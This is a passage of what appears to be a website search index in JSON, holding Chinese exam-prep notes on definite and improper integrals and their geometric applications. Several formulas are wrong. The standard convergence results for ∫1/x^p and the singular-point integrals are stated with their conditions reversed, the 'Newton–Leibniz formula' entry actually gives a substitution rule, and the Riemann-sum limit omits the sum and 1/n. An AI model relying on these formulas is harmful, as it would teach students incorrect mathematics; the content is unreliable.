\u65e0\u754c\u51fd\u6570\u7684\u53cd\u5e38\u79ef\u5206","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#1","text":"\u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e94\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#2","text":"","title":"2. \u5b9a\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#21","text":"\u5b9a\u4e49\uff1a \\int_a^{b} {f(x)} dx = \\lim\\limits_{\\lambda \\to 0}{\\sum_{i = 1}^n{f(\\xi_i)\\Delta x_i}} \\tag{5.1} \u5176\u4e2d \\lambda = max\\{\\Delta x_i\\}, i\\in [1, n] \uff0c \\xi_i \u4e3a\u5728 [x_{i - 1}, x_i] \u4e0a\u4efb\u53d6\u7684\u4e00\u70b9\u3002 \u5229\u7528\u5b9a\u79ef\u5206\u6c42\u6781\u9650\uff1a \u82e5\u79ef\u5206 \\displaystyle \\int_{0}^{1} f(x) dx \u5b58\u5728\uff0c\u5c06 [0, 1] \u533a\u95f4\u7b49\u5206\uff0c\u6b64\u65f6 \\Delta x_i = \\dfrac{1}{n} \uff0c \u53d6 \\xi_i = \\dfrac{1}{n} \uff0c \u7531\u5b9a\u79ef\u5206\u7684\u5b9a\u4e49\u5f97 \\int_0^{1} {f(x)} dx = \\lim\\limits_{\\lambda \\to 0}{\\sum_{i = 1}^n{f(\\xi_i)\\Delta x_i}} = \\lim\\limits_{n \\to \\infty}{f(\\frac{i}{n})} \\tag{5.2}","title":"2.1. \u5b9a\u79ef\u5206\u7684\u5b9a\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#22","text":"","title":"2.2. \u5b9a\u79ef\u5206\u7684\u6027\u8d28"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#23","text":"\u5b9a\u4e49\uff1a \u53d8\u4e0a\u9650\u7684\u79ef\u5206 \\displaystyle \\int_a^{b} {f(x)} dx \u662f\u5176\u4e0a\u9650\u7684\u51fd\u6570\uff0c\u5e38\u79f0\u4e4b\u4e3a\u79ef\u5206\u4e0a\u9650\u51fd\u6570\u3002 \u5b9a\u7406\uff1a \u5982\u679c f(x) \u5728\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219 ( \\int_{a}^{x} f(t) dt )' = f(x) \\tag{5.3} \u5982\u679c f(x) \u4e3a [a, b] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c \\varphi_1(x), \\varphi_2(x) \u4e3a\u53ef\u5bfc\u51fd\u6570\uff0c\u5219 ( \\int_{\\varphi_1(x)}^{\\varphi_2(x)} f(t) dt )' = f[ \\varphi_2(x) ] \\cdot \\varphi_2'(x) - f[ \\varphi_1(x) ] \\cdot \\varphi_1'(x) \\tag{5.4}","title":"2.3. \u79ef\u5206\u4e0a\u9650\u51fd\u6570"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#24","text":"","title":"2.4. \u5b9a\u79ef\u5206\u7684\u8ba1\u7b97"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#241-","text":"\u8bbe f(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c F(x) \u4e3a f(x) \u5728 [a, b] \u4e0a\u7684\u4e00\u4e2a\u539f\u51fd\u6570\uff0c\u5219\u6709 \\int_{a}^{b} f(x) dx = \\int_{\\alpha}^{\\beta} f[\\varphi(t)] \\varphi'(t) dt \\tag{5.5}","title":"2.4.1. \u725b\u987f-\u83b1\u5e03\u5c3c\u8328\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#242","text":"","title":"2.4.2. \u6362\u5143\u79ef\u5206\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#243","text":"\\int_{a}^{b} u dv = uv \\Big|_a^b - \\int_{a}^{b} v du \\tag{5.6}","title":"2.4.3. \u5206\u90e8\u79ef\u5206\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#244","text":"","title":"2.4.4. \u5229\u7528\u5947\u5076\u6027\u548c\u5468\u671f\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#245","text":"","title":"2.4.5. \u5229\u7528\u5df2\u6709\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#3","text":"","title":"3. \u53cd\u5e38\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#31","text":"\u5b9a\u4e49 \uff1a \u8bbe f(x) \u4e3a [a, \\infty] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u5982\u679c\u6781\u9650 \\displaystyle\\lim\\limits_{t \\to +\\infty} \\int_{a}^{t} {f(x)}dx \u5b58\u5728 \uff0c\u5219\u79f0\u6b64\u6781\u9650\u4e3a\u51fd\u6570 f(x)\u5728\u65e0\u7a77\u533a\u95f4 [a, \\infty] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206\uff0c\u8bb0\u4f5c \\displaystyle\\int_{a}^{+\\infty} f(x) dx \uff0c\u5373 \\int_{a}^{+\\infty} f(x) dx = \\lim\\limits_{t \\to +\\infty} \\int_{a}^{t} {f(x)}dx \\tag{5.7} \u8fd9\u65f6\u4e5f\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u6536\u655b \uff0c\u5982\u679c\u4e0a\u8ff0\u6781\u9650\u4e0d\u5b58\u5728\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u53d1\u6563 \u3002 \u8bbe f(x) \u4e3a [-\\infty, b] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u5219\u53ef\u7c7b\u4f3c\u7684\u5b9a\u4e49\u51fd\u6570 f(x) \u5728\u65e0\u7a77\u533a\u95f4 [-\\infty, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206 \\int_{-\\infty}^{b} f(x) dx = \\lim\\limits_{t \\to -\\infty} \\int_{a}^{t} {f(x)}dx \\tag{5.8} \u8bbe f(x) \u4e3a [-\\infty, +\\infty] \u4e0a\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u5982\u679c\u53cd\u5e38\u79ef\u5206 \\int_{-\\infty}^{0} f(x) dx \\text{\u548c} \\int_{0}^{+\\infty} f(x) dx \u90fd\u6536\u655b\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\int_{-\\infty}^{+\\infty} f(x) dx \u6536\u655b\uff0c\u4e14 \\int_{-\\infty}^{+\\infty} f(x) dx = \\int_{-\\infty}^{0} f(x) dx + \\int_{0}^{+\\infty} f(x) dx \\tag{5.9} \u5982\u679c\u81f3\u5c11\u6709\u4e00\u4e2a\u53d1\u6563\uff0c\u5219\u79f0 \\int_{-\\infty}^{+\\infty} f(x) dx \u53d1\u6563 \u3002 \u5e38\u7528\u7ed3\u8bba \uff1a \\int_{a}^{+\\infty} \\frac{1}{x^p} dx {\\left\\{ \\begin{aligned} p > 1 & , \\text{\u53d1\u6563} \\\\ p \\le 1 & , \\text{\u6536\u655b} \\\\ \\end{aligned}\\right. }, (a>0) \\tag{5.10}","title":"3.1. \u65e0\u7a77\u533a\u95f4\u4e0a\u7684\u53cd\u5e38\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/5.%E7%AC%AC%E4%BA%94%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86/#32","text":"\u5982\u679c\u51fd\u6570 f(x) \u5728\u70b9 a \u7684\u4efb\u4e00\u90bb\u57df\u5185\u90fd\u65e0\u754c\uff0c\u90a3\u4e48\u70b9 a \u79f0\u4e3a \u51fd\u6570 f(x) \u7684\u7455\u70b9\uff08\u4e5f\u79f0\u4e3a\u65e0\u754c\u70b9\uff09\u3002\u65e0\u754c\u51fd\u6570\u7684\u53cd\u5e38\u79ef\u5206\u4e5f\u79f0\u4e3a \u7455\u79ef\u5206 \u3002 \u5b9a\u4e49 \uff1a \u8bbe f(x) \u5728 (a, b] \u4e0a\u8fde\u7eed\uff0c\u70b9 a \u4e3a\u51fd\u6570\u7684\u7455\u70b9\u3002\u5982\u679c\u6781\u9650 \\displaystyle\\lim\\limits_{t \\to a^+} \\int_{t}^{b} {f(x)}dx \u5b58\u5728 \uff0c\u5219\u79f0\u6b64\u6781\u9650\u4e3a\u51fd\u6570 f(x)\u5728\u65e0\u7a77\u533a\u95f4 [a, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206\uff0c\u8bb0\u4f5c \\displaystyle\\int_{a}^{b} f(x) dx \uff0c\u5373 \\int_{a}^{b} f(x) dx = \\lim\\limits_{t \\to a^+} \\int_{t}^{b} {f(x)}dx \\tag{5.11} \u8fd9\u65f6\u4e5f\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u6536\u655b \uff0c\u5982\u679c\u4e0a\u8ff0\u6781\u9650\u4e0d\u5b58\u5728\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\displaystyle\\int_{a}^{+\\infty} f(x) dx \u53d1\u6563 \u3002 \u8bbe f(x) \u5728 [a, b) \u4e0a\u8fde\u7eed\uff0c\u70b9 b \u4e3a\u51fd\u6570 f(x) \u7684\u7455\u70b9\u3002\u5219\u53ef\u7c7b\u4f3c\u7684\u5b9a\u4e49\u51fd\u6570 f(x) \u5728\u533a\u95f4 [a, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206 \\int_{a}^{b} f(x) dx = \\lim\\limits_{t \\to a^+} \\int_{t}^{b} {f(x)}dx \\tag{5.12} \u8bbe f(x) \u5728 [a, b) \u4e0a\u9664 c \u70b9\u5916\u8fde\u7eed\uff0c\u70b9 c \u4e3a\u51fd\u6570 f(x) \u7684\u7455\u70b9\u3002\u5219\u53ef\u7c7b\u4f3c\u7684\u5b9a\u4e49\u51fd\u6570 f(x) \u5728\u533a\u95f4 [a, b] \u4e0a\u7684\u53cd\u5e38\u79ef\u5206 \\int_{a}^{c} f(x) dx \\text{\u548c} \\int_{c}^{b} f(x) dx \u90fd\u6536\u655b\uff0c\u5219\u79f0\u53cd\u5e38\u79ef\u5206 \\int_{a}^{b} f(x) dx \u6536\u655b\uff0c\u4e14 \\int_{a}^{b} f(x) dx = \\int_{a}^{c} f(x) dx + \\int_{c}^{b} f(x) dx \\tag{5.13} \u5982\u679c\u81f3\u5c11\u6709\u4e00\u4e2a\u53d1\u6563\uff0c\u5219\u79f0 \\int_{a}^{b} f(x) dx \u53d1\u6563 \u3002 \u5e38\u7528\u7ed3\u8bba \uff1a \\int_{a}^{b} \\frac{1}{(x-a)^p} dx {\\left\\{ \\begin{aligned} p < 1 & , \\text{\u53d1\u6563} \\\\ p \\ge 1 & , \\text{\u6536\u655b} \\\\ \\end{aligned}\\right. } \\tag{5.14} \\int_{a}^{b} \\frac{1}{(b-x)^p} dx {\\left\\{ \\begin{aligned} p < 1 & , \\text{\u53d1\u6563} \\\\ p \\ge 1 & , \\text{\u6536\u655b} \\\\ \\end{aligned}\\right. } \\tag{5.15}","title":"3.2. \u65e0\u754c\u51fd\u6570\u7684\u53cd\u5e38\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/","text":"\u7b2c\u516d\u7ae0 \u5b9a\u79ef\u5206\u7684\u5e94\u7528 # \u76ee\u5f55 # \u7b2c\u516d\u7ae0 \u5b9a\u79ef\u5206\u7684\u5e94\u7528 \u76ee\u5f55 1. \u80cc\u666f 2. \u51e0\u4f55\u5e94\u7528 2.1. \u5e73\u9762\u56fe\u5f62\u7684\u9762\u79ef 2.2. \u65cb\u8f6c\u4f53\u4f53\u79ef 2.3. \u65cb\u8f6c\u4f53\u4fa7\u9762\u79ef 3. \u7269\u7406\u5e94\u7528 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u516d\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002 2. \u51e0\u4f55\u5e94\u7528 # 2.1. \u5e73\u9762\u56fe\u5f62\u7684\u9762\u79ef # \u53ef\u901a\u8fc7\u4e8c\u91cd\u79ef\u5206 S = \\iint_D 1 d \\sigma \u8fdb\u884c\u8ba1\u7b97\u3002 \u82e5\u5e73\u9762\u57df D \u7531\u66f2\u7ebf y = f(x), y=g(x), (f(x) \\ge g(x)), x = a, x = b, )a < b) \u6240\u56f4\u6210\uff0c\u5219\u5e73\u9762\u57df D \u7684\u9762\u79ef\u4e3a S = \\int_{a}^{b} [f(x) - g(x)] dx \\tag{6.1} \u82e5\u5e73\u9762\u57df D \u7531\u66f2\u7ebf \\rho = \\rho(\\theta), \\theta = \\alpha, \\theta = \\beta(\\alpha < \\beta) \u6240\u56f4\u6210\uff0c\u5219\u5176\u9762\u79ef\u4e3a S = \\frac{1}{2} \\int_{\\alpha}^{\\beta} \\rho^2(\\theta) d\\theta \\tag{6.2} 2.2. \u65cb\u8f6c\u4f53\u4f53\u79ef # \u53ef\u901a\u8fc7\u4e8c\u91cd\u79ef\u5206 V = 2\\pi \\iint_D y d \\sigma \u548c V = 2\\pi \\iint_D x d \\sigma \u8fdb\u884c\u8ba1\u7b97\u3002 \u82e5\u533a\u57df D \u7531 y = f(x), (f(x) \\ge 0) \u548c\u76f4\u7ebf x = a, x = b, (0 \\le a \\le b) \u53ca x \u8f74\u6240\u56f4\u6210\u7684\uff0c\u5219 \u533a\u57df D \u7ed5 x \u8f74\u65cb\u8f6c\u4e00\u5468\u6240\u5f97\u5230\u7684\u65cb\u8f6c\u4f53\u4f53\u79ef\u4e3a V_x = \\pi \\int_{a}^{b} f^2(x) dx \\tag{6.3} \u533a\u57df D \u7ed5 y \u8f74\u65cb\u8f6c\u4e00\u5468\u6240\u5f97\u5230\u7684\u65cb\u8f6c\u4f53\u4f53\u79ef\u4e3a V_y = 2\\pi \\int_{a}^{b} xf(x) dx \\tag{6.4} \u66f2\u7ebf\u5f27\u957f C: y = y(x), a \\le x \\le b s = \\int_{a}^{b} \\sqrt[]{1 + y'^2} dx \\tag{6.5} C: \\left\\{\\begin{array}{l}x\\;=\\;x(t)\\\\y\\;=\\;y(t)\\end{array},\\;\\alpha\\;\\leq t\\;\\leq\\beta\\right. s = \\int_{\\alpha}^{\\beta} \\sqrt[]{x'^2 + y'^2} dt \\tag{6.6} C: \\rho = \\rho(\\theta), \\alpha \\le \\theta \\le \\beta s = \\int_{\\alpha}^{\\beta} \\sqrt[]{\\rho^2 + \\rho'^2} d\\theta \\tag{6.7} 2.3. \u65cb\u8f6c\u4f53\u4fa7\u9762\u79ef # \u66f2\u7ebf y = f(x), (f(x) \\ge 0) \u548c \u76f4\u7ebf x = a, x = b, (0 \\le a \\le b) \u53ca x \u8f74\u6240\u56f4\u6210\u533a\u57df\u7ed5 x \u8f74\u65cb\u8f6c\u6240\u5f97\u65cb\u8f6c\u4f53\u7684\u4fa7\u9762\u79ef\u4e3a S = 2 \\pi \\int_{a}^{b} f(x) \\sqrt[]{1 + f'^2(x)} dx \\tag{6.8} 3. \u7269\u7406\u5e94\u7528 # \u538b\u529b \u53d8\u529b\u505a\u529f \u5f15\u529b","title":"6.\u7b2c\u516d\u7ae0 \u5b9a\u79ef\u5206\u7684\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#_1","text":"","title":"\u7b2c\u516d\u7ae0 \u5b9a\u79ef\u5206\u7684\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#_2","text":"\u7b2c\u516d\u7ae0 \u5b9a\u79ef\u5206\u7684\u5e94\u7528 \u76ee\u5f55 1. \u80cc\u666f 2. \u51e0\u4f55\u5e94\u7528 2.1. \u5e73\u9762\u56fe\u5f62\u7684\u9762\u79ef 2.2. \u65cb\u8f6c\u4f53\u4f53\u79ef 2.3. \u65cb\u8f6c\u4f53\u4fa7\u9762\u79ef 3. \u7269\u7406\u5e94\u7528","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#1","text":"\u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u516d\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#2","text":"","title":"2. \u51e0\u4f55\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#21","text":"\u53ef\u901a\u8fc7\u4e8c\u91cd\u79ef\u5206 S = \\iint_D 1 d \\sigma \u8fdb\u884c\u8ba1\u7b97\u3002 \u82e5\u5e73\u9762\u57df D \u7531\u66f2\u7ebf y = f(x), y=g(x), (f(x) \\ge g(x)), x = a, x = b, )a < b) \u6240\u56f4\u6210\uff0c\u5219\u5e73\u9762\u57df D \u7684\u9762\u79ef\u4e3a S = \\int_{a}^{b} [f(x) - g(x)] dx \\tag{6.1} \u82e5\u5e73\u9762\u57df D \u7531\u66f2\u7ebf \\rho = \\rho(\\theta), \\theta = \\alpha, \\theta = \\beta(\\alpha < \\beta) \u6240\u56f4\u6210\uff0c\u5219\u5176\u9762\u79ef\u4e3a S = \\frac{1}{2} \\int_{\\alpha}^{\\beta} \\rho^2(\\theta) d\\theta \\tag{6.2}","title":"2.1. \u5e73\u9762\u56fe\u5f62\u7684\u9762\u79ef"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#22","text":"\u53ef\u901a\u8fc7\u4e8c\u91cd\u79ef\u5206 V = 2\\pi \\iint_D y d \\sigma \u548c V = 2\\pi \\iint_D x d \\sigma \u8fdb\u884c\u8ba1\u7b97\u3002 \u82e5\u533a\u57df D \u7531 y = f(x), (f(x) \\ge 0) \u548c\u76f4\u7ebf x = a, x = b, (0 \\le a \\le b) \u53ca x \u8f74\u6240\u56f4\u6210\u7684\uff0c\u5219 \u533a\u57df D \u7ed5 x \u8f74\u65cb\u8f6c\u4e00\u5468\u6240\u5f97\u5230\u7684\u65cb\u8f6c\u4f53\u4f53\u79ef\u4e3a V_x = \\pi \\int_{a}^{b} f^2(x) dx \\tag{6.3} \u533a\u57df D \u7ed5 y \u8f74\u65cb\u8f6c\u4e00\u5468\u6240\u5f97\u5230\u7684\u65cb\u8f6c\u4f53\u4f53\u79ef\u4e3a V_y = 2\\pi \\int_{a}^{b} xf(x) dx \\tag{6.4} \u66f2\u7ebf\u5f27\u957f C: y = y(x), a \\le x \\le b s = \\int_{a}^{b} \\sqrt[]{1 + y'^2} dx \\tag{6.5} C: \\left\\{\\begin{array}{l}x\\;=\\;x(t)\\\\y\\;=\\;y(t)\\end{array},\\;\\alpha\\;\\leq t\\;\\leq\\beta\\right. s = \\int_{\\alpha}^{\\beta} \\sqrt[]{x'^2 + y'^2} dt \\tag{6.6} C: \\rho = \\rho(\\theta), \\alpha \\le \\theta \\le \\beta s = \\int_{\\alpha}^{\\beta} \\sqrt[]{\\rho^2 + \\rho'^2} d\\theta \\tag{6.7}","title":"2.2. \u65cb\u8f6c\u4f53\u4f53\u79ef"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#23","text":"\u66f2\u7ebf y = f(x), (f(x) \\ge 0) \u548c \u76f4\u7ebf x = a, x = b, (0 \\le a \\le b) \u53ca x \u8f74\u6240\u56f4\u6210\u533a\u57df\u7ed5 x \u8f74\u65cb\u8f6c\u6240\u5f97\u65cb\u8f6c\u4f53\u7684\u4fa7\u9762\u79ef\u4e3a S = 2 \\pi \\int_{a}^{b} f(x) \\sqrt[]{1 + f'^2(x)} dx \\tag{6.8}","title":"2.3. \u65cb\u8f6c\u4f53\u4fa7\u9762\u79ef"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/6.%E7%AC%AC%E5%85%AD%E7%AB%A0_%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/#3","text":"\u538b\u529b \u53d8\u529b\u505a\u529f \u5f15\u529b","title":"3. \u7269\u7406\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E4%B9%A0%E9%A2%98/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD_%E9%94%99%E9%A2%98/","text":"\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u9519\u9898 # \u76ee\u5f55 # \u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u9519\u9898 \u76ee\u5f55 1. \u6781\u9650 1.1. \u6781\u9650\u5b9a\u4e49 1.2. \u6c42\u6781\u9650 1.3. \u5e42\u6307\u578b\u6c42\u6781\u9650 1.4. \u5df2\u77e5\u6781\u9650\u6c42\u53c2\u6570 1.5. \u540c\u9636\u65e0\u7a77\u5c0f 1.6. \u6570\u5217\u6781\u9650\u4e0e\u9012\u63a8\u5173\u7cfb 2. \u51fd\u6570\u7684\u8fde\u7eed\u6027 2.1. \u51fd\u6570\u8fde\u7eed 2.2. \u95f4\u65ad\u70b9 2.3. \u53ef\u5bfc\u3001\u8fde\u7eed\u6c42\u76f8\u5173\u53c2\u6570 1. \u6781\u9650 # 1.1. \u6781\u9650\u5b9a\u4e49 # 1.2. \u6c42\u6781\u9650 # 1.2.1. \u6765\u6e90:\u300a660\u9898\u300b - 7 I= \\lim\\limits_{x \\to 0}{\\frac{(1-\\sqrt[]{\\cos x}) (1-\\sqrt[3]{\\cos x}) \\cdots (1-\\sqrt[n]{\\cos x})} {(1 - \\cos x)^{n-1}}} = \\underline{\\hspace*{1cm}}. \u6ce8\u610f \uff1a\u6b64\u5904\u4e0d\u80fd\u4f7f\u7528\u5939\u903c\u51c6\u5219 \u7b54\u6848 $$ n! 